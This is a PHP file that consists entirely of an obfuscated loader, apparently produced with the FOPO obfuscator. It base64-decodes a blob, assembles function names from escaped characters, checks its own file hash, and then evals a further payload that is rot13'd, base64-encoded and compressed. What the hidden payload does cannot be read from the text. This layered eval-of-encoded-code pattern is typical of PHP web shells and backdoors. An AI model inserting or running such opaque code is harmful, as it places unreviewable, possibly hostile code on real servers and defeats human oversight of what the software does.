<?php
//Obfuscation provided by FOPO - Free Online PHP Obfuscator v1.2: http://www.fopo.com.ar
$p94fadfedd45="\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65";@eval($p94fadfedd45(
"JGo0NTE1NWJlOWFhMDgzMjRmY2UxMzg3MDBmZGYwNDZmPSJceDYyIjskcGZmOGY1YTI4ZWY3YTExNDQzZWQyMzN
lYWU5NDNjNWY9Ilx4NjUiOyR3NDg2YzM1OTRhMzE2ZDJjZGVmYmVlYzRjNTUyNGNlZD0iXHg2NiI7JHIzZWQ0Yjk
yNWU0NTQzZDEwYzZkY2I5NWRmMzVjNjk1PSJceDY3IjskejI2YWYxMzZmYjFlY2EwOGU5YWVhMTA5OWYxMjc5ODU
9Ilx4NmQiOyRhMjYwZTU0ZmRkYTBlYTE4ODFkOGUwMWUxZDQxMzJmYT0iXHg2ZiI7JGc3NjlhZjdhMjRjZDhhODJ
jODMwYTkzODI1MzZhOTQ3PSJceDZmIjskdmIwYjgyNDYxYmVkNjNkMmI4ZWNkYzAwNWI3MTM0ODg9Ilx4NmYiOyR
sZTZiZWYwYzY1YjAyZWYyMjdmY2M3ODcwYTJhMTBlNj0iXHg2ZiI7JGtkYzFkYWQ5NThmMDk3ZmNjZjZjZjZlZmF
jN2JlYmU0PSJceDczIjskczcyMzUzNjA3NTI0ODkzOTgwZjIzM2NlZWExMDFkY2Y9Ilx4NzMiOyRoOTdhZWViNTk
2MDYyZTgwNjhiMjVhMmRkNjcyMmQxMT0iXHg3MyI7JGcyMGI2MWE5MDdjYTk2YTZkMmM5OGRjZGVlZmU1MzBmPSJ
ceDczIjskajQ1MTU1YmU5YWEwODMyNGZjZTEzODcwMGZkZjA0NmYuPSJcMTQxIjskcGZmOGY1YTI4ZWY3YTExNDQ
zZWQyMzNlYWU5NDNjNWYuPSJcMTYyIjskdzQ4NmMzNTk0YTMxNmQyY2RlZmJlZWM0YzU1MjRjZWQuPSJcMTUxIjs
kcjNlZDRiOTI1ZTQ1NDNkMTBjNmRjYjk1ZGYzNWM2OTUuPSJcMTcyIjskejI2YWYxMzZmYjFlY2EwOGU5YWVhMTA
5OWYxMjc5ODUuPSJcMTQ0IjskYTI2MGU1NGZkZGEwZWExODgxZDhlMDFlMWQ0MTMyZmEuPSJcMTQyIjskZzc2OWF
mN2EyNGNkOGE4MmM4MzBhOTM4MjUzNmE5NDcuPSJcMTQyIjskdmIwYjgyNDYxYmVkNjNkMmI4ZWNkYzAwNWI3MTM
0ODguPSJcMTQyIjskbGU2YmVmMGM2NWIwMmVmMjI3ZmNjNzg3MGEyYTEwZTYuPSJcMTQyIjska2RjMWRhZDk1OGY
wOTdmY2NmNmNmNmVmYWM3YmViZTQuPSJcMTY0IjskczcyMzUzNjA3NTI0ODkzOTgwZjIzM2NlZWExMDFkY2YuPSJ
cMTY0IjskaDk3YWVlYjU5NjA2MmU4MDY4YjI1YTJkZDY3MjJkMTEuPSJcMTY0IjskZzIwYjYxYTkwN2NhOTZhNmQ
yYzk4ZGNkZWVmZTUzMGYuPSJcMTY0IjskajQ1MTU1YmU5YWEwODMyNGZjZTEzODcwMGZkZjA0NmYuPSJceDczIjs
kcGZmOGY1YTI4ZWY3YTExNDQzZWQyMzNlYWU5NDNjNWYuPSJceDY1IjskdzQ4NmMzNTk0YTMxNmQyY2RlZmJlZWM
0YzU1MjRjZWQuPSJceDZjIjskcjNlZDRiOTI1ZTQ1NDNkMTBjNmRjYjk1ZGYzNWM2OTUuPSJceDY5IjskejI2YWY
xMzZmYjFlY2EwOGU5YWVhMTA5OWYxMjc5ODUuPSJceDM1IjskYTI2MGU1NGZkZGEwZWExODgxZDhlMDFlMWQ0MTM
yZmEuPSJceDVmIjskZzc2OWFmN2EyNGNkOGE4MmM4MzBhOTM4MjUzNmE5NDcuPSJceDVmIjskdmIwYjgyNDYxYmV
kNjNkMmI4ZWNkYzAwNWI3MTM0ODguPSJceDVmIjskbGU2YmVmMGM2NWIwMmVmMjI3ZmNjNzg3MGEyYTEwZTYuPSJ
ceDVmIjska2RjMWRhZDk1OGYwOTdmY2NmNmNmNmVmYWM3YmViZTQuPSJceDcyIjskczcyMzUzNjA3NTI0ODkzOTg
wZjIzM2NlZWExMDFkY2YuPSJceDcyIjskaDk3YWVlYjU5NjA2MmU4MDY4YjI1YTJkZDY3MjJkMTEuPSJceDcyIjs
kZzIwYjYxYTkwN2NhOTZhNmQyYzk4ZGNkZWVmZTUzMGYuPSJceDcyIjskajQ1MTU1YmU5YWEwODMyNGZjZTEzODc
wMGZkZjA0NmYuPSJcMTQ1IjskcGZmOGY1YTI4ZWY3YTExNDQzZWQyMzNlYWU5NDNjNWYuPSJcMTQ3IjskdzQ4NmM
zNTk0YTMxNmQyY2RlZmJlZWM0YzU1MjRjZWQuPSJcMTQ1IjskcjNlZDRiOTI1ZTQ1NDNkMTBjNmRjYjk1ZGYzNWM
2OTUuPSJcMTU2IjskYTI2MGU1NGZkZGEwZWExODgxZDhlMDFlMWQ0MTMyZmEuPSJcMTQ1IjskZzc2OWFmN2EyNGN
kOGE4MmM4MzBhOTM4MjUzNmE5NDcuPSJcMTQ1IjskdmIwYjgyNDYxYmVkNjNkMmI4ZWNkYzAwNWI3MTM0ODguPSJ
cMTQ3IjskbGU2YmVmMGM2NWIwMmVmMjI3ZmNjNzg3MGEyYTEwZTYuPSJcMTYzIjska2RjMWRhZDk1OGYwOTdmY2N
mNmNmNmVmYWM3YmViZTQuPSJcMTM3IjskczcyMzUzNjA3NTI0ODkzOTgwZjIzM2NlZWExMDFkY2YuPSJcMTM3Ijs
kaDk3YWVlYjU5NjA2MmU4MDY4YjI1YTJkZDY3MjJkMTEuPSJcMTYwIjskZzIwYjYxYTkwN2NhOTZhNmQyYzk4ZGN
kZWVmZTUzMGYuPSJcMTY0IjskajQ1MTU1YmU5YWEwODMyNGZjZTEzODcwMGZkZjA0NmYuPSJceDM2IjskcGZmOGY
1YTI4ZWY3YTExNDQzZWQyMzNlYWU5NDNjNWYuPSJceDVmIjskdzQ4NmMzNTk0YTMxNmQyY2RlZmJlZWM0YzU1MjR
jZWQuPSJceDVmIjskcjNlZDRiOTI1ZTQ1NDNkMTBjNmRjYjk1ZGYzNWM2OTUuPSJceDY2IjskYTI2MGU1NGZkZGE
wZWExODgxZDhlMDFlMWQ0MTMyZmEuPSJceDZlIjskZzc2OWFmN2EyNGNkOGE4MmM4MzBhOTM4MjUzNmE5NDcuPSJ
ceDZlIjskdmIwYjgyNDYxYmVkNjNkMmI4ZWNkYzAwNWI3MTM0ODguPSJceDY1IjskbGU2YmVmMGM2NWIwMmVmMjI
3ZmNjNzg3MGEyYTEwZTYuPSJceDc0Ijska2RjMWRhZDk1OGYwOTdmY2NmNmNmNmVmYWM3YmViZTQuPSJceDcyIjs
kczcyMzUzNjA3NTI0ODkzOTgwZjIzM2NlZWExMDFkY2YuPSJceDcyIjskaDk3YWVlYjU5NjA2MmU4MDY4YjI1YTJ
kZDY3MjJkMTEuPSJceDZmIjskZzIwYjYxYTkwN2NhOTZhNmQyYzk4ZGNkZWVmZTUzMGYuPSJceDZmIjskajQ1MTU
1YmU5YWEwODMyNGZjZTEzODcwMGZkZjA0NmYuPSJcNjQiOyRwZmY4ZjVhMjhlZjdhMTE0NDNlZDIzM2VhZTk0M2M
1Zi49IlwxNjIiOyR3NDg2YzM1OTRhMzE2ZDJjZGVmYmVlYzRjNTUyNGNlZC49IlwxNDciOyRyM2VkNGI5MjVlNDU
0M2QxMGM2ZGNiOTVkZjM1YzY5NS49IlwxNTQiOyRhMjYwZTU0ZmRkYTBlYTE4ODFkOGUwMWUxZDQxMzJmYS49Ilw
xNDQiOyRnNzY5YWY3YTI0Y2Q4YTgyYzgzMGE5MzgyNTM2YTk0Ny49IlwxNDQiOyR2YjBiODI0NjFiZWQ2M2QyYjh
lY2RjMDA1YjcxMzQ4OC49IlwxNjQiOyRsZTZiZWYwYzY1YjAyZWYyMjdmY2M3ODcwYTJhMTBlNi49IlwxNDEiOyR
rZGMxZGFkOTU4ZjA5N2ZjY2Y2Y2Y2ZWZhYzdiZWJlNC49IlwxNDUiOyRzNzIzNTM2MDc1MjQ4OTM5ODBmMjMzY2V
lYTEwMWRjZi49IlwxNTciOyRoOTdhZWViNTk2MDYyZTgwNjhiMjVhMmRkNjcyMmQxMS49IlwxNjMiOyRnMjBiNjF
hOTA3Y2E5NmE2ZDJjOThkY2RlZWZlNTMwZi49IlwxNTMiOyRqNDUxNTViZTlhYTA4MzI0ZmNlMTM4NzAwZmRmMDQ
2Zi49Ilx4NWYiOyRwZmY4ZjVhMjhlZjdhMTE0NDNlZDIzM2VhZTk0M2M1Zi49Ilx4NjUiOyR3NDg2YzM1OTRhMzE
2ZDJjZGVmYmVlYzRjNTUyNGNlZC49Ilx4NjUiOyRyM2VkNGI5MjVlNDU0M2QxMGM2ZGNiOTVkZjM1YzY5NS49Ilx
4NjEiOyRhMjYwZTU0ZmRkYTBlYTE4ODFkOGUwMWUxZDQxMzJmYS49Ilx4NWYiOyRnNzY5YWY3YTI0Y2Q4YTgyYzg
zMGE5MzgyNTM2YTk0Ny49Ilx4NWYiOyR2YjBiODI0NjFiZWQ2M2QyYjhlY2RjMDA1YjcxMzQ4OC49Ilx4NWYiOyR
sZTZiZWYwYzY1YjAyZWYyMjdmY2M3ODcwYTJhMTBlNi49Ilx4NzIiOyRrZGMxZGFkOTU4ZjA5N2ZjY2Y2Y2Y2ZWZ
hYzdiZWJlNC49Ilx4NzAiOyRzNzIzNTM2MDc1MjQ4OTM5ODBmMjMzY2VlYTEwMWRjZi49Ilx4NzQiOyRqNDUxNTV
iZTlhYTA4MzI0ZmNlMTM4NzAwZmRmMDQ2Zi49IlwxNDQiOyRwZmY4ZjVhMjhlZjdhMTE0NDNlZDIzM2VhZTk0M2M
1Zi49IlwxNjAiOyR3NDg2YzM1OTRhMzE2ZDJjZGVmYmVlYzRjNTUyNGNlZC49IlwxNjQiOyRyM2VkNGI5MjVlNDU
0M2QxMGM2ZGNiOTVkZjM1YzY5NS49IlwxNjQiOyRhMjYwZTU0ZmRkYTBlYTE4ODFkOGUwMWUxZDQxMzJmYS49Ilw
xNDMiOyRnNzY5YWY3YTI0Y2Q4YTgyYzgzMGE5MzgyNTM2YTk0Ny49IlwxNDYiOyR2YjBiODI0NjFiZWQ2M2QyYjh
lY2RjMDA1YjcxMzQ4OC49IlwxNDMiOyRsZTZiZWYwYzY1YjAyZWYyMjdmY2M3ODcwYTJhMTBlNi49IlwxNjQiOyR
rZGMxZGFkOTU4ZjA5N2ZjY2Y2Y2Y2ZWZhYzdiZWJlNC49IlwxNTQiOyRzNzIzNTM2MDc1MjQ4OTM5ODBmMjMzY2V
lYTEwMWRjZi49Ilw2MSI7JGo0NTE1NWJlOWFhMDgzMjRmY2UxMzg3MDBmZGYwNDZmLj0iXHg2NSI7JHBmZjhmNWE
yOGVmN2ExMTQ0M2VkMjMzZWFlOTQzYzVmLj0iXHg2YyI7JHc0ODZjMzU5NGEzMTZkMmNkZWZiZWVjNGM1NTI0Y2V
kLj0iXHg1ZiI7JHIzZWQ0YjkyNWU0NTQzZDEwYzZkY2I5NWRmMzVjNjk1Lj0iXHg2NSI7JGEyNjBlNTRmZGRhMGV
hMTg4MWQ4ZTAxZTFkNDEzMmZhLj0iXHg2YyI7JGc3NjlhZjdhMjRjZDhhODJjODMwYTkzODI1MzZhOTQ3Lj0iXHg
2YyI7JHZiMGI4MjQ2MWJlZDYzZDJiOGVjZGMwMDViNzEzNDg4Lj0iXHg2ZiI7JGtkYzFkYWQ5NThmMDk3ZmNjZjZ
jZjZlZmFjN2JlYmU0Lj0iXHg2MSI7JHM3MjM1MzYwNzUyNDg5Mzk4MGYyMzNjZWVhMTAxZGNmLj0iXHgzMyI7JGo
0NTE1NWJlOWFhMDgzMjRmY2UxMzg3MDBmZGYwNDZmLj0iXDE0MyI7JHBmZjhmNWEyOGVmN2ExMTQ0M2VkMjMzZWF
lOTQzYzVmLj0iXDE0MSI7JHc0ODZjMzU5NGEzMTZkMmNkZWZiZWVjNGM1NTI0Y2VkLj0iXDE0MyI7JGEyNjBlNTR
mZGRhMGVhMTg4MWQ4ZTAxZTFkNDEzMmZhLj0iXDE0NSI7JGc3NjlhZjdhMjRjZDhhODJjODMwYTkzODI1MzZhOTQ
3Lj0iXDE2NSI7JHZiMGI4MjQ2MWJlZDYzZDJiOGVjZGMwMDViNzEzNDg4Lj0iXDE1NiI7JGtkYzFkYWQ5NThmMDk
3ZmNjZjZjZjZlZmFjN2JlYmU0Lj0iXDE0MyI7JGo0NTE1NWJlOWFhMDgzMjRmY2UxMzg3MDBmZGYwNDZmLj0iXHg
2ZiI7JHBmZjhmNWEyOGVmN2ExMTQ0M2VkMjMzZWFlOTQzYzVmLj0iXHg2MyI7JHc0ODZjMzU5NGEzMTZkMmNkZWZ
iZWVjNGM1NTI0Y2VkLj0iXHg2ZiI7JGEyNjBlNTRmZGRhMGVhMTg4MWQ4ZTAxZTFkNDEzMmZhLj0iXHg2MSI7JGc
3NjlhZjdhMjRjZDhhODJjODMwYTkzODI1MzZhOTQ3Lj0iXHg3MyI7JHZiMGI4MjQ2MWJlZDYzZDJiOGVjZGMwMDV
iNzEzNDg4Lj0iXHg3NCI7JGtkYzFkYWQ5NThmMDk3ZmNjZjZjZjZlZmFjN2JlYmU0Lj0iXHg2NSI7JGo0NTE1NWJ
lOWFhMDgzMjRmY2UxMzg3MDBmZGYwNDZmLj0iXDE0NCI7JHBmZjhmNWEyOGVmN2ExMTQ0M2VkMjMzZWFlOTQzYzV
mLj0iXDE0NSI7JHc0ODZjMzU5NGEzMTZkMmNkZWZiZWVjNGM1NTI0Y2VkLj0iXDE1NiI7JGEyNjBlNTRmZGRhMGV
hMTg4MWQ4ZTAxZTFkNDEzMmZhLj0iXDE1NiI7JGc3NjlhZjdhMjRjZDhhODJjODMwYTkzODI1MzZhOTQ3Lj0iXDE
1MCI7JHZiMGI4MjQ2MWJlZDYzZDJiOGVjZGMwMDViNzEzNDg4Lj0iXDE0NSI7JGo0NTE1NWJlOWFhMDgzMjRmY2U
xMzg3MDBmZGYwNDZmLj0iXHg2NSI7JHc0ODZjMzU5NGEzMTZkMmNkZWZiZWVjNGM1NTI0Y2VkLj0iXHg3NCI7JHZ
iMGI4MjQ2MWJlZDYzZDJiOGVjZGMwMDViNzEzNDg4Lj0iXHg2ZSI7JHc0ODZjMzU5NGEzMTZkMmNkZWZiZWVjNGM
1NTI0Y2VkLj0iXDE0NSI7JHZiMGI4MjQ2MWJlZDYzZDJiOGVjZGMwMDViNzEzNDg4Lj0iXDE2NCI7JHc0ODZjMzU
5NGEzMTZkMmNkZWZiZWVjNGM1NTI0Y2VkLj0iXHg2ZSI7JHZiMGI4MjQ2MWJlZDYzZDJiOGVjZGMwMDViNzEzNDg
4Lj0iXHg3MyI7JHc0ODZjMzU5NGEzMTZkMmNkZWZiZWVjNGM1NTI0Y2VkLj0iXDE2NCI7JHc0ODZjMzU5NGEzMTZ
kMmNkZWZiZWVjNGM1NTI0Y2VkLj0iXHg3MyI7JGxlNmJlZjBjNjViMDJlZjIyN2ZjYzc4NzBhMmExMGU2KCk7aWY
oJHoyNmFmMTM2ZmIxZWNhMDhlOWFlYTEwOTlmMTI3OTg1KCRwZmY4ZjVhMjhlZjdhMTE0NDNlZDIzM2VhZTk0M2M
1ZigiXHg1Y1w1MFx4MjJcMTMzXHgzMFw1NVx4MzlcMTAxXHgyZFwxMzJceDYxXDU1XHg3YVwxMzRceDJiXDU3XHg
zZFwxMzVceDJhXDQyXHg1Y1w1MSIsIlx4MjhcNDJceDIyXDUxIiwka2RjMWRhZDk1OGYwOTdmY2NmNmNmNmVmYWM
3YmViZTQoIlxyXG4iLCIiLCR3NDg2YzM1OTRhMzE2ZDJjZGVmYmVlYzRjNTUyNGNlZCgkZzIwYjYxYTkwN2NhOTZ
hNmQyYzk4ZGNkZWVmZTUzMGYoX19GSUxFX18sIlx4MjgiKSkpKSk9PSJceDM0XDE0NVx4MzlcMTQ0XHg2Nlw2NVx
4MzNcNzFceDMwXDE0M1x4MzZcMTQxXHg2NVw2Nlx4NjRcNzBceDMyXDYyXHgzNVwxNDRceDY0XDcwXHg2M1w2M1x
4MzBcMTQ2XHgzNlw2MFx4MzNcNjdceDMyXDYzIil7QGV2YWwoJHIzZWQ0YjkyNWU0NTQzZDEwYzZkY2I5NWRmMzV
jNjk1KCRqNDUxNTViZTlhYTA4MzI0ZmNlMTM4NzAwZmRmMDQ2ZigkczcyMzUzNjA3NTI0ODkzOTgwZjIzM2NlZWE
xMDFkY2YoImdJRWdHOWZqUkM0ZUUvZE9RR0lrMGVxT3h0bkFBdHR4QXVRZUFDUldCTHpvSll1MjVldU1ScmMvM2x
JU1lNRmtHOWk1dDMzYTVsN0NpR3d4NlZGQktQOE1RTG5oMWs4QkNVcDRDM29xQnJoYWo0RzI2TE5xeHFaYkNXdXJ
HMk0zQW1TcG1ZNXBqcDMzZjZpWVBJdDJWRy82UjBYemYrYXpMaFA0WkFBSElna2pXbnh0V0M1ZEVKU3VTdlZYWC9
aYlRXd1V4YjBnajFuVGNTSlN5anIyYW53ZjhGenU2SEJoMUlXekNhRXZlMXlPZGJHRmRZZGdPVVp5d0Qrckk2N04
wUlZnbk9xZGN3WmQ4TU5tbEplcGtHWXlUcjZVempDeEZQcXd1MTJ0enlDRXVMWFd6dXpyVmRFUGJhb1NBVzhVUDZ
jbVlhMjNLTkh5bUdWaHBrOG5NSDJzVGRjMmt5WHluTUJIUTh2RG5wUnkyOVllYk1rWlJCaktQdGFPSmsrY3FpTnE
zeHpIa3l3M1BwK08vZzJjWjI5eW0rc3E3NzN1K1BYTmNDSjliRGEydGliVnJyd1BYMUNBZktmZjY4V1lWMDBBZTl
4N1NBcjcxZ3k3VUtnVzE0Q0tDRzdpQUpoL2traDhlS3lyTFgvSTB5R1pEQUNrbXdGQjNvdlVWSUFkMmlFc3VraFp
1YytCRTlnajU2MDh3MGx2RU5NclE2QzhiM2FNUWZ6dFRFVmFLSmJ6bUcwVGU3TmY4Q0cvT2FLZ2daOFZuL3pVRUI
xc29TQjJXZzl0b3FnRUZTYjRDeFNUZmx0MDNYT2xYRmdRdUR3V0V0MEttU05id1B5ZzlhQ1c2N1MxVDUvc2tnOGh
ZUnRrWFBMMmdna3RkcEpMOFYwYWl5Y2xSSytyRWhVTTlzRGhoekhNMWpqYUVCbkI0NEZ4QUZWUC9qdUVyU2JKV0R
QSnVsN0xPNGd3dnZmVUdJTEthdUp1MHRzZUw3TlVGRU1sTzJhanZRdkFzdFo9IikpKSk7fSRoOTdhZWViNTk2MDY
yZTgwNjhiMjVhMmRkNjcyMmQxMSgkdmIwYjgyNDYxYmVkNjNkMmI4ZWNkYzAwNWI3MTM0ODgoKSwiXHgzOVwxNDF
ceDM2XDYwXHgzMVwxNDJceDM2XDY0XHgzNVw2MFx4MzFcNjNceDM1XDY0XHgzMVw2MFx4MzVcMTQ2XHgzOFw2MFx
4MzBcMTQ2XHg2NVw2M1x4NjNcNjVceDYyXDE0MVx4MzNcMTQxXHgzNFwxNDUiKT8kYTI2MGU1NGZkZGEwZWExODg
xZDhlMDFlMWQ0MTMyZmEoKTokZzc2OWFmN2EyNGNkOGE4MmM4MzBhOTM4MjUzNmE5NDcoKTs="));
?>
